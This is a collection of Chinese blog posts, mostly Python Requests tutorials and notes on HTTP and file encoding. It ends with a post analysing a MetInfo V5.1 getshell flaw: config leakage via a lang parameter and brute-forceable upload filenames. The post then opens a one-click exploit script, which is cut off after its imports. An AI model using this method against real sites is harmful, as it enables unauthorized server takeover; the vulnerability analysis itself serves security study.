('foo.png', open('foo.png', 'rb'), 'image/png')), ('images', ('bar.png', open('bar.png', 'rb'), 'image/png'))]&gt;&gt;&gt; r = requests.post(url, files=multiple_files)&gt;&gt;&gt; r.text&#123; ... 'files': &#123;'images': 'data:image/png;base64,iVBORw ....'&#125; 'Content-Type': 'multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a', ...&#125; 事件挂钩 Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理。 可用的钩子: response: 从一个请求产生的响应 你可以通过传递一个 {hook_name: callback_function} 字典给 hooks 请求参数 为每个请求分配一个钩子函数: 1hooks=dict(response=print_url) callback_function 会接受一个数据块作为它的第一个参数。 12def print_url(r): print(r.url) 若执行你的回调函数期间发生错误，系统会给出一个警告。 若回调函数返回一个值，默认以该值替换传进来的数据。若函数未返回任何东西， 也没有什么其他的影响。 我们来在运行期间打印一些请求方法的参数: 123&gt;&gt;&gt; requests.get('http://httpbin.org', hooks=dict(response=print_url))http://httpbin.org&lt;Response [200]&gt; 自定义身份验证 Requests允许你使用自己指定的身份验证机制。 任何传递给请求方法的 auth 参数的可调用对象，在请求发出之前都有机会修改请求。 自定义的身份验证机制是作为 requests.auth.AuthBase 的子类来实现的，也非常容易定义。 Requests在 requests.auth 中提供了两种常见的的身份验证方案： HTTPBasicAuth 和 HTTPDigestAuth 。 假设我们有一个web服务，仅在 X-Pizza 头被设置为一个密码值的情况下才会有响应。虽然这不太可能， 但就以它为例好了 123456789101112from requests.auth import AuthBaseclass PizzaAuth(AuthBase): """Attaches HTTP Pizza Authentication to the given Request object.""" def __init__(self, username): # setup any auth-related data here self.username = username def __call__(self, r): # modify and return the request r.headers['X-Pizza'] = self.username return r 然后就可以使用我们的PizzaAuth来进行网络请求: 12&gt;&gt;&gt; requests.get('http://pizzabin.org/admin', auth=PizzaAuth('kenneth'))&lt;Response [200]&gt; 流式请求 使用 requests.Response.iter_lines() 你可以很方便地对流式API（例如 Twitter的流式API ）进行迭代。简单地设置 stream 为 True 便可以使用 iter_lines() 对相应进行迭代: 12345678910import jsonimport requestsr = requests.get('http://httpbin.org/stream/20', stream=True)for line in r.iter_lines(): # filter out keep-alive new lines if line: print(json.loads(line)) 代理 如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求: 12345678import requestsproxies = &#123; "http": "http://10.10.1.10:3128", "https": "http://10.10.1.10:1080",&#125;requests.get("http://example.org", proxies=proxies) 你也可以通过环境变量 HTTP_PROXY 和 HTTPS_PROXY 来配置代理。123$ export HTTP_PROXY="http://10.10.1.10:3128"$ export HTTPS_PROXY="http://10.10.1.10:1080"$ python 12&gt;&gt;&gt; import requests&gt;&gt;&gt; requests.get("http://example.org") 若你的代理需要使用HTTP Basic Auth，可以使用 http://user:password@host/ 语法: 123proxies = &#123; "http": "http://user:pass@10.10.1.10:3128/",&#125; 合规性 Requests符合所有相关的规范和RFC，这样不会为用户造成不必要的困难。但这种对规范的考虑 导致一些行为对于不熟悉相关规范的人来说看似有点奇怪。 编码方式当你收到一个响应时，Requests会猜测响应的编码方式，用于在你调用 Response.text 方法时 对响应进行解码。Requests首先在HTTP头部检测是否存在指定的编码方式，如果不存在，则会使用 charade 来尝试猜测编码方式。 只有当HTTP头部不存在明确指定的字符集，并且 Content-Type 头部字段包含 text 值之时， Requests才不去猜测编码方式。 在这种情况下， RFC 2616 指定默认字符集 必须是 ISO-8859-1 。Requests遵从这一规范。如果你需要一种不同的编码方式，你可以手动设置 Response.encoding 属性，或使用原始的 Response.content 。(可结合上一篇安装使用快速上手中的 响应内容 学习) HTTP请求类型(附加例子) Requests提供了几乎所有HTTP请求类型的功能：GET，OPTIONS， HEAD，POST，PUT，PATCH和DELETE。 以下内容为使用Requests中的这些请求类型以及Github API提供了详细示例。 我将从最常使用的请求类型GET开始。HTTP GET是一个幂等的方法，从给定的URL返回一个资源。因而， 当你试图从一个web位置获取数据之时，你应该使用这个请求类型。一个使用示例是尝试从Github上获取 关于一个特定commit的信息。假设我们想获取Requests的commit a050faf 的信息。我们可以 这样去做: 12&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get('https://api.github.com/repos/kennethreitz/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad') 我们应该确认Github是否正确响应。如果正确响应，我们想弄清响应内容是什么类型的。像这样去做: 1234&gt;&gt;&gt; if (r.status_code == requests.codes.ok):... print r.headers['content-type']...application/json; charset=utf-8 可见，GitHub返回了JSON数据，非常好，这样就可以使用 r.json 方法把这个返回的数据解析成Python对象。 1234567&gt;&gt;&gt; commit_data = r.json()&gt;&gt;&gt; print commit_data.keys()[u'committer', u'author', u'url', u'tree', u'sha', u'parents', u'message']&gt;&gt;&gt; print commit_data[u'committer']&#123;u'date': u'2012-05-10T11:10:50-07:00', u'email': u'me@kennethreitz.com', u'name': u'Kenneth Reitz'&#125;&gt;&gt;&gt; print commit_data[u'message']makin' history 到目前为止，一切都非常简单。嗯，我们来研究一下GitHub的API。我们可以去看看文档， 但如果使用Requests来研究也许会更有意思一点。我们可以借助Requests的OPTIONS请求类型来看看我们刚使用过的url 支持哪些HTTP方法。 123&gt;&gt;&gt; verbs = requests.options(r.url)&gt;&gt;&gt; verbs.status_code500 额，这是怎么回事？毫无帮助嘛！原来GitHub，与许多API提供方一样，实际上并未实现OPTIONS方法。 这是一个恼人的疏忽，但没关系，那我们可以使用枯燥的文档。然而，如果GitHub正确实现了OPTIONS， 那么服务器应该在响应头中返回允许用户使用的HTTP方法，例如： 123&gt;&gt;&gt; verbs = requests.options('http://a-good-website.com/api/cats')&gt;&gt;&gt; print verbs.headers['allow']GET,HEAD,POST,OPTIONS 转而去查看文档，我们看到对于提交信息，另一个允许的方法是POST，它会创建一个新的提交。 由于我们正在使用Requests代码库，我们应尽可能避免对它发送笨拙的POST。作为替代，我们来 玩玩GitHub的Issue特性。 本篇文档是回应Issue #482而添加的。鉴于该问题已经存在，我们就以它为例。先获取它。 12345678&gt;&gt;&gt; r = requests.get('https://api.github.com/repos/kennethreitz/requests/issues/482')&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; issue = json.loads(r.text)&gt;&gt;&gt; print issue[u'title']Feature any http verb in docs&gt;&gt;&gt; print issue[u'comments']3 Cool，有3个评论。我们来看一下最后一个评论。 12345678&gt;&gt;&gt; r = requests.get(r.url + u'/comments')&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; comments = r.json()&gt;&gt;&gt; print comments[0].keys()[u'body', u'url', u'created_at', u'updated_at', u'user', u'id']&gt;&gt;&gt; print comments[2][u'body']Probably in the "advanced" section 嗯，那看起来似乎是个愚蠢之处。我们发表个评论来告诉这个评论者他自己的愚蠢。那么，这个评论者是谁呢？ 12&gt;&gt;&gt; print comments[2][u'user'][u'login']kennethreitz 好，我们来告诉这个叫肯尼思的家伙，这个例子应该放在快速上手指南中。根据GitHub API文档， 其方法是POST到该话题。我们来试试看。 12345&gt;&gt;&gt; body = json.dumps(&#123;u"body": u"Sounds great! I'll get right on it!"&#125;)&gt;&gt;&gt; url = u"https://api.github.com/repos/kennethreitz/requests/issues/482/comments"&gt;&gt;&gt; r = requests.post(url=url, data=body)&gt;&gt;&gt; r.status_code404 额，这有点古怪哈。可能我们需要验证身份。那就有点纠结了，对吧？不对。Requests简化了多种身份验证形式的使用， 包括非常常见的Basic Auth。 12345678&gt;&gt;&gt; from requests.auth import HTTPBasicAuth&gt;&gt;&gt; auth = HTTPBasicAuth('fake@example.com', 'not_a_real_password')&gt;&gt;&gt; r = requests.post(url=url, data=body, auth=auth)&gt;&gt;&gt; r.status_code201&gt;&gt;&gt; content = r.json()&gt;&gt;&gt; print(content[u'body'])Sounds great! I'll get right on it. 精彩！噢，不！我原本是想说等我一会，因为我得去喂一下我的猫。如果我能够编辑这条评论那就好了！ 幸运的是，GitHub允许我们使用另一个HTTP动词，PATCH，来编辑评论。我们来试试。 1234567&gt;&gt;&gt; print(content[u"id"])5804413&gt;&gt;&gt; body = json.dumps(&#123;u"body": u"Sounds great! I'll get right on it once I feed my cat."&#125;)&gt;&gt;&gt; url = u"https://api.github.com/repos/kennethreitz/requests/issues/comments/5804413"&gt;&gt;&gt; r = requests.patch(url=url, data=body, auth=auth)&gt;&gt;&gt; r.status_code200 非常好。现在，我们来折磨一下这个叫肯尼思的家伙，我决定要让他急得团团转，也不告诉他是我在捣蛋。 这意味着我想删除这条评论。GitHub允许我们使用完全名副其实的DELETE方法来删除评论。我们来清除该评论。 12345&gt;&gt;&gt; r = requests.delete(url=url, auth=auth)&gt;&gt;&gt; r.status_code204&gt;&gt;&gt; r.headers['status']'204 No Content' 很好。不见了。最后一件我想知道的事情是我已经使用了多少限额（ratelimit）。查查看，GitHub在响应头部发送这个信息， 因此不必下载整个网页，我将使用一个HEAD请求来获取响应头。 123456&gt;&gt;&gt; r = requests.head(url=url, auth=auth)&gt;&gt;&gt; print r.headers...'x-ratelimit-remaining': '4995''x-ratelimit-limit': '5000'... 很好。是时候写个Python程序以各种刺激的方式滥用GitHub的API，还可以使用4995次呢。 响应头链接字段 许多HTTP API都有响应头链接字段的特性，它们使得API能够更好地自我描述和自我显露。 GitHub在API中为 分页 使用这些特性，例如: 1234&gt;&gt;&gt; url = 'https://api.github.com/users/kennethreitz/repos?page=1&amp;per_page=10'&gt;&gt;&gt; r = requests.head(url=url)&gt;&gt;&gt; r.headers['link']'&lt;https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10&gt;; rel="next", &lt;https://api.github.com/users/kennethreitz/repos?page=6&amp;per_page=10&gt;; rel="last"' Requests会自动解析这些响应头链接字段，并使得它们非常易于使用: 12345&gt;&gt;&gt; r.links["next"]&#123;'url': 'https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10', 'rel': 'next'&#125;&gt;&gt;&gt; r.links["last"]&#123;'url': 'https://api.github.com/users/kennethreitz/repos?page=7&amp;per_page=10', 'rel': 'last'&#125; Transport Adapters As of v1.0.0, Requests has moved to a modular internal design. Part of the reason this was done was to implement Transport Adapters, originally described here. Transport Adapters provide a mechanism to define interaction methods for an HTTP service. In particular, they allow you to apply per-service configuration. Requests ships with a single Transport Adapter, the HTTPAdapter. This adapter provides the default Requests interaction with HTTP and HTTPS using the powerful urllib3 library. Whenever a Requests Session is initialized, one of these is attached to the Session object for HTTP, and one for HTTPS. Requests enables users to create and use their own Transport Adapters that provide specific functionality. Once created, a Transport Adapter can be mounted to a Session object, along with an indication of which web services it should apply to. 12&gt;&gt;&gt; s = requests.Session()&gt;&gt;&gt; s.mount('http://www.github.com', MyAdapter()) The mount call registers a specific instance of a Transport Adapter to a prefix. Once mounted, any HTTP request made using that session whose URL starts with the given prefix will use the given Transport Adapter. Many of the details of implementing a Transport Adapter are beyond the scope of this documentation, but take a look at the next example for a simple SSL use- case. For more than that, you might look at subclassing requests.adapters.BaseAdapter. Example: Specific SSL VersionThe Requests team has made a specific choice to use whatever SSL version is default in the underlying library (urllib3). Normally this is fine, but from time to time, you might find yourself needing to connect to a service-endpoint that uses a version that isn’t compatible with the default. You can use Transport Adapters for this by taking most of the existing implementation of HTTPAdapter, and adding a parameter ssl_version that gets passed-through to urllib3. We’ll make a TA that instructs the library to use SSLv3: 1234567891011121314import sslfrom requests.adapters import HTTPAdapterfrom requests.packages.urllib3.poolmanager import PoolManagerclass Ssl3HttpAdapter(HTTPAdapter): """"Transport adapter" that allows us to use SSLv3.""" def init_poolmanager(self, connections, maxsize, block=False): self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, ssl_version=ssl.PROTOCOL_SSLv3) Blocking Or Non-Blocking? With the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The Response.content property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see 流式请求) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block. If you are concerned about the use of blocking IO, there are lots of projects out there that combine Requests with one of Python’s asynchronicity frameworks. Two excellent examples are grequests and requests-futures. Timeouts Most requests to external servers should have a timeout attached, in case the server is not responding in a timely manner. Without a timeout, your code may hang for minutes or more. The connect timeout is the number of seconds Requests will wait for your client to establish a connection to a remote machine (corresponding to the connect()) call on the socket. It’s a good practice to set connect timeouts to slightly larger than a multiple of 3, which is the default TCP packet retransmission window. Once your client has connected to the server and sent the HTTP request, the read timeout is the number of seconds the client will wait for the server to send a response. (Specifically, it’s the number of seconds that the client will wait between bytes sent from the server. In 99.9% of cases, this is the time before the server sends the first byte). If you specify a single value for the timeout, like this: 1r = requests.get('https://github.com', timeout=5) The timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately: 1r = requests.get('https://github.com', timeout=(3.05, 27)) If the remote server is very slow, you can tell Requests to wait forever for a response, by passing None as a timeout value and then retrieving a cup of coffee. 1r = requests.get('https://github.com', timeout=None) CA Certificates By default Requests bundles a set of root CAs that it trusts, sourced from the Mozilla trust store. However, these are only updated once for each Requests version. This means that if you pin a Requests version your certificates can become extremely out of date. From Requests version 2.4.0 onwards, Requests will attempt to use certificates from certifi if it is present on the system. This allows for users to update their trusted certificates without having to change the code that runs on their system. For the sake of security we recommend upgrading certifi frequently! 说明：前面有些官方文档没翻译到的，我自己翻译了，后一部分，时间太晚了，是在没精力了，以后有时间再翻译，可能我翻译的有些语句不通顺，但是还是能大概表达出意思的，如果你对比了官方文档，觉得你可以翻译得更好，可以私信或留言我哦 想喷我的人也省省吧，的确，这篇文章和之前的一篇Requests安装使用都是我从官网移植过来的，但是我花时间翻译了一部分，排版也废了番功夫，使用MarkDown写成，需要源md文档也可以找我索要，本文随意传播 我是Akkuman，同道人可以和我一起交流哦，私信或留言均可,我的博客hacktech.cn | 53xiaoshuo.com]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTTP协议请求类型介绍]]></title>
      <url>%2F2016%2F06%2F10%2FHTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D.html</url>
      <content type="text"><![CDATA[HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下： OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。 HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 GET：向特定的资源发出请求。 POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 PUT：向指定资源位置上传其最新内容。 DELETE：请求服务器删除Request-URI所标识的资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 虽然HTTP的请求方式有8种，但是我们在实际应用中常用的也就是get和post，其他请求方式也都可以通过这两种方式间接的来实现。 转载自：http://www.xuebuyuan.com/1586750.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python中的open和codecs.open]]></title>
      <url>%2F2016%2F06%2F10%2FPython%E4%B8%AD%E7%9A%84open%E5%92%8Ccodecs-open.html</url>
      <content type="text"><![CDATA[最近老被编码困扰，多次折腾之后，感觉python的编解码做得挺好的，只要了解下边的流程，一般都能解决 input文件(gbk, utf-8…) —-decode—–&gt; unicode ——-encode——&gt; output文件(gbk, utf-8…)很多文本挖掘的package是在unicode上边做事的，比如nltk. 所以开始读入文件后要decode为unicode格式，可以通过下边两步：12f=open('XXXXX', 'r')content=f.read().decode('utf-8') 更好的方法是使用codecs.open读入时直接解码：12f=codecs.open(XXX, encoding='utf-8')content=f.read() 转自: http://f.dataguru.cn/thread-237116-1-1.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python之Requests的安装与基本使用]]></title>
      <url>%2F2016%2F06%2F09%2FPython%E4%B9%8BRequests%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html</url>
      <content type="text"><![CDATA[安装 使用 pip 安装Requests非常简单1pip install requests 或者使用 easy_install 安装1easy_install requests 获得源码 Requests 一直在Github上被积极的开发着 你可以克隆公共版本库: 1git clone git://github.com/kennethreitz/requests.git 下载 源码: 1curl -OL https://github.com/kennethreitz/requests/tarball/master 或者下载 zipball: 1curl -OL https://github.com/kennethreitz/requests/zipball/master 一旦你获得了复本，你就可以轻松的将它嵌入到你的python包里或者安装到你的site-packages: 1python setup.py install 快速上手 发送请求 使用Requests发送网络请求非常简单。 一开始要导入Requests模块: 1&gt;&gt;&gt; import requests 然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线 1&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json') 现在，我们有一个名为 r 的 Response 对象。可以从这个对象中获取所有我们想要的信息。 Requests简便的API意味着所有HTTP请求类型都是显而易见的。例如，你可以这样发送一个HTTP POST请求: 1&gt;&gt;&gt; r = requests.post("http://httpbin.org/post") 漂亮，对吧？那么其他HTTP请求类型：PUT， DELETE， HEAD以及OPTIONS又是如何的呢？都是一样的简单: 1234&gt;&gt;&gt; r = requests.put("http://httpbin.org/put")&gt;&gt;&gt; r = requests.delete("http://httpbin.org/delete")&gt;&gt;&gt; r = requests.head("http://httpbin.org/get")&gt;&gt;&gt; r = requests.options("http://httpbin.org/get") 都很不错吧，但这也仅是Requests的冰山一角呢。 为URL传递参数 你也许经常想为URL的查询字符串(query string)传递某种数据。如果你是手工构建URL，那么数据会以键/值 对的形式置于URL中，跟在一个问号的后面。例如， httpbin.org/get?key=val 。 Requests允许你使用 params 关键字参数，以一个字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码: 12&gt;&gt;&gt; payload = &#123;'key1': 'value1', 'key2': 'value2'&#125;&gt;&gt;&gt; r = requests.get("http://httpbin.org/get", params=payload) 通过打印输出该URL，你能看到URL已被正确编码: 12&gt;&gt;&gt; print(r.url)http://httpbin.org/get?key2=value2&amp;key1=value1 注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。 响应内容 我们能读取服务器响应的内容。再次以Github时间线为例: 1234&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json')&gt;&gt;&gt; r.textu'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/... Requests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。 请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它: 123&gt;&gt;&gt; r.encoding'utf-8'&gt;&gt;&gt; r.encoding = 'ISO-8859-1' 如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了。 在你需要的情况下，Requests也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由Requests来为你处理编码。 二进制响应内容 你也能以字节的方式访问请求响应体，对于非文本请求: 12&gt;&gt;&gt; r.contentb'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/... Requests会自动为你解码 gzip 和 deflate 传输编码的响应数据。 例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码: 123&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; from StringIO import StringIO&gt;&gt;&gt; i = Image.open(StringIO(r.content)) JSON响应内容 Requests中也有一个内置的JSON解码器，助你处理JSON数据: 1234&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json')&gt;&gt;&gt; r.json()[&#123;u'repository': &#123;u'open_issues': 0, u'url': 'https://github.com/... 如果JSON解码失败， r.json 就会抛出一个异常。例如，相应内容是 401 (Unauthorized) ，尝试访问 r.json 将会抛出 ValueError: No JSON object could be decoded 异常。 原始响应内容 在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True 。具体的你可以这么做: 12345&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json', stream=True)&gt;&gt;&gt; r.raw&lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;&gt;&gt;&gt; r.raw.read(10)'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03' 但一般情况下，你应该以下面的模式将文本流保存到文件: 123with open(filename, 'wb') as fd: for chunk in r.iter_content(chunk_size): fd.write(chunk) 使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是优先推荐的获取内容方式。 定制请求头 如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。 例如，在前一个示例中我们没有指定content-type: 123456&gt;&gt;&gt; import json&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'&gt;&gt;&gt; payload = &#123;'some': 'data'&#125;&gt;&gt;&gt; headers = &#123;'content-type': 'application/json'&#125;&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload), headers=headers) 更加复杂的POST请求 通常，你想要发送一些编码为表单形式的数据—非常像一个HTML表单。 要实现这个，只需简单地传递一个字典给 data 参数。你的数据字典 在发出请求时会自动编码为表单形式: 1234567891011&gt;&gt;&gt; payload = &#123;'key1': 'value1', 'key2': 'value2'&#125;&gt;&gt;&gt; r = requests.post("http://httpbin.org/post", data=payload)&gt;&gt;&gt; print r.text&#123; ... "form": &#123; "key2": "value2", "key1": "value1" &#125;, ...&#125; 很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict ，那么数据会被直接发布出去。 例如，Github API v3接受编码为JSON的POST/PATCH数据: 12345&gt;&gt;&gt; import json&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'&gt;&gt;&gt; payload = &#123;'some': 'data'&#125;&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload)) POST一个多部分编码(Multipart-Encoded)的文件 Requests使得上传多部分编码文件变得很简单: 123456789101112&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; files = &#123;'file': open('report.xls', 'rb')&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text&#123; ... "files": &#123; "file": "&lt;censored...binary...data&gt;" &#125;, ...&#125; 你可以显式地设置文件名，文件类型和请求头: 123456789101112&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; files = &#123;'file': ('report.xls', open('report.xls', 'rb'), 'application/vnd.ms-excel', &#123;'Expires': '0'&#125;)&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text&#123; ... "files": &#123; "file": "&lt;censored...binary...data&gt;" &#125;, ...&#125; 如果你想，你也可以发送作为文件来接收的字符串: 123456789101112&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; files = &#123;'file': ('report.csv', 'some,data,to,send\nanother,row,to,send\n')&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text&#123; ... "files": &#123; "file": "some,data,to,send\\nanother,row,to,send\\n" &#125;, ...&#125; 如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望流请求(?)。默认下 requests 不支持, 但有个第三方包支持 - requests-toolbelt. 你可以阅读 toolbelt 文档 来了解使用方法。 在一个请求中发送多文件参考 高级用法 一节. 响应状态码 我们可以检测响应状态码: 123&gt;&gt;&gt; r = requests.get('http://httpbin.org/get')&gt;&gt;&gt; r.status_code200 为方便引用，Requests还附带了一个内置的状态码查询对象: 12&gt;&gt;&gt; r.status_code == requests.codes.okTrue 如果发送了一个失败请求(非200响应)，我们可以通过 Response.raise_for_status() 来抛出异常: 123456789&gt;&gt;&gt; bad_r = requests.get('http://httpbin.org/status/404')&gt;&gt;&gt; bad_r.status_code404&gt;&gt;&gt; bad_r.raise_for_status()Traceback (most recent call last): File "requests/models.py", line 832, in raise_for_status raise http_errorrequests.exceptions.HTTPError: 404 Client Error 但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是: 12&gt;&gt;&gt; r.raise_for_status()None 一切都挺和谐哈。 响应头 我们可以查看以一个Python字典形式展示的服务器响应头: 12345678910&gt;&gt;&gt; r.headers&#123; 'content-encoding': 'gzip', 'transfer-encoding': 'chunked', 'connection': 'close', 'server': 'nginx/1.0.4', 'x-runtime': '148ms', 'etag': '"e1ca502697e5c9317743dc078f67693f"', 'content-type': 'application/json'&#125; 但是这个字典比较特殊：它是仅为HTTP头部而生的。根据 RFC 2616 ， HTTP头部是大小写不敏感的。 因此，我们可以使用任意大写形式来访问这些响应头字段: 12345&gt;&gt;&gt; r.headers['Content-Type']'application/json'&gt;&gt;&gt; r.headers.get('content-type')'application/json' Cookies 如果某个响应中包含一些Cookie，你可以快速访问它们: 12345&gt;&gt;&gt; url = 'http://example.com/some/cookie/setting/url'&gt;&gt;&gt; r = requests.get(url)&gt;&gt;&gt; r.cookies['example_cookie_name']'example_cookie_value' 要想发送你的cookies到服务器，可以使用 cookies 参数: 123456&gt;&gt;&gt; url = 'http://httpbin.org/cookies'&gt;&gt;&gt; cookies = dict(cookies_are='working')&gt;&gt;&gt; r = requests.get(url, cookies=cookies)&gt;&gt;&gt; r.text'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;' 重定向与请求历史 默认情况下，除了 HEAD, Requests会自动处理所有重定向。 可以使用响应对象的 history 方法来追踪重定向。 Response.history 是一个:class:Response&lt;requests.Response&gt; 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。 例如，Github将所有的HTTP请求重定向到HTTPS。: 1234567&gt;&gt;&gt; r = requests.get(&apos;http://github.com&apos;)&gt;&gt;&gt; r.url&apos;https://github.com/&apos;&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; r.history[&lt;Response [301]&gt;] 如果你使用的是GET, OPTIONS, POST, PUT, PATCH 或者 DELETE,，那么你可以通过 allow_redirects 参数禁用重定向处理: 12345&gt;&gt;&gt; r = requests.get('http://github.com', allow_redirects=False)&gt;&gt;&gt; r.status_code301&gt;&gt;&gt; r.history[] 如果你使用的是HEAD，你也可以启用重定向: 12345&gt;&gt;&gt; r = requests.head('http://github.com', allow_redirects=True)&gt;&gt;&gt; r.url'https://github.com/'&gt;&gt;&gt; r.history[&lt;Response [301]&gt;] 超时 你可以告诉requests在经过以 timeout 参数设定的秒数时间之后停止等待响应: 12345&gt;&gt;&gt; requests.get('http://github.com', timeout=0.001)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;requests.exceptions.Timeout: HTTPConnectionPool(host='github.com', port=80): Request timed out. (timeout=0.001) 注::timeout 仅对连接过程有效，与响应体的下载无关。timeout并不是整个下载响应的时间限制，而是如果服务器在timeout秒内没有应答，将会引发一个异常（更精确地说，是在timeout秒内没有从基础套接字上接收到任何字节的数据时） 错误与异常 遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个 ConnectionError 异常。 遇到罕见的无效HTTP响应时，Requests则会抛出一个 HTTPError 异常。 若请求超时，则抛出一个 Timeout 异常。 若请求超过了设定的最大重定向次数，则会抛出一个 TooManyRedirects 异常。 所有Requests显式抛出的异常都继承自 requests.exceptions.RequestException 。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[编码转换工具]]></title>
      <url>%2F2016%2F06%2F09%2F%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.html</url>
      <content type="text"><![CDATA[闲来无事，写了款编码转换工具 以我的审美来看，界面应该算美丽 截图 : 下载地址：编码转换工具 转载请注明出处 作者博客 53xiaoshou.com | hacktech.cn]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MetInfo V5.1 GetShell一键化工具]]></title>
      <url>%2F2016%2F06%2F08%2FMetInfo-V5-1-GetShell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7.html</url>
      <content type="text"><![CDATA[漏洞解析： config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&gt;get_one("SELECT * FROM $met_lang WHERE lang='$lang'");if(!$langoks)die('No data in the database,please reinstall.');if(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo('../404.html');if(count($met_langok)==1)$lang=$met_index_type;$query = "SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'";//看这里$result = $db-&gt;query($query);while($list_config= $db-&gt;fetch_array($result))&#123; if($metinfoadminok)$list_config['value']=str_replace('"', '&amp;#34;', str_replace("'", '&amp;#39;',$list_config['value'])); $settings_arr[]=$list_config; if($list_config['columnid'])&#123; $settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value']; &#125;else&#123; $settings[$list_config['name']]=$list_config['value']; &#125;&#125;@extract($settings); 访问 http:///localhost/metinfo5.1/index.php?lang=metinfo SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39; 文件命名方式： /feedback/uploadfile_save.php1234567srand((double)microtime() * 1000000);$rnd = rand(100, 999);$name = date('U') + $rnd;$name = $name.".".$ext; 文件保存在/upload/file/目录 命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数 可爆破： 如 http://127.0.0.1/upload/file/1465394396.php 一键化利用工具： 本程序基于python编写 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#!/usr/bin/env python#-*- coding: utf-8 -*-import requestsimport Queueimport threadingimport timeimport sysheaders = 